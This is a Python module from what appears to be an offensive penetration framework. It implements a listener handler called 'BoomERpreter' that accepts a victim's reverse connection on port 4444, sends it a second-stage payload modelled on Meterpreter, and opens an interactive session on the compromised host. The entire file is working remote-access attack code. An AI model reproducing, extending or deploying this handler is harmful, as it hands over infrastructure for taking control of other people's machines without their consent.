import socket
import sys
from threading import Thread
import struct
import time
from module import Module
from os import sep
import pickle
from extra_functions.sessions.session import Session

class BoomerModule(Module):
    def __init__(self):
        info = {"Name": "BoomERpreter",
                "Author": "Josue Encinar",
                "Description": "Open a channel to interact with a targer",
                }
        options = {
            "lport": ["Open a local port to receive the connection", 4444, True],
            "lhost": ["Local host to receive the connection", "192.168.206.128", True]
            }
        self.sessions = Session.getInstance()
        super(BoomerModule, self).__init__(options,info)
               
    def run(self):
        # Create a TCP/IP socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(14)
        # Bind the socket to the port
        server_address = (self.options["lhost"][1], int(self.options["lport"][1]))
        print('starting up on %s port %s' % server_address)
        sock.bind(server_address)
        # Listen for incoming connections
        sock.listen(1)
        try:
            print('waiting for a connection')
            client, client_address = sock.accept()
            try:
                print('Sending BoomErpreter --> %s:%s' % (client_address[0], str(client_address[1])))
                file_boomer = ("support%sboomerpreter%sboomerpreter.py" % (sep,sep))
                meterpreter = open(file_boomer, "r").read()
                meterpreter = meterpreter.encode()
                l = struct.pack('>I', len(meterpreter))
                client.send(l)
                c = client.send(meterpreter)
                if c == 0:
                    return
                print("Send %s bytes" % str(c))
                platform = client.recv(1024)
                session_id = self.sessions.set_session(client, platform.decode())
                self.print_info("Session %s has been created" % str(session_id))
                res = self.sessions.interact(session_id)
                if res:
                    return
            except Exception as e:
                print(str(e))
        except:
            pass
        finally:
            sock.close()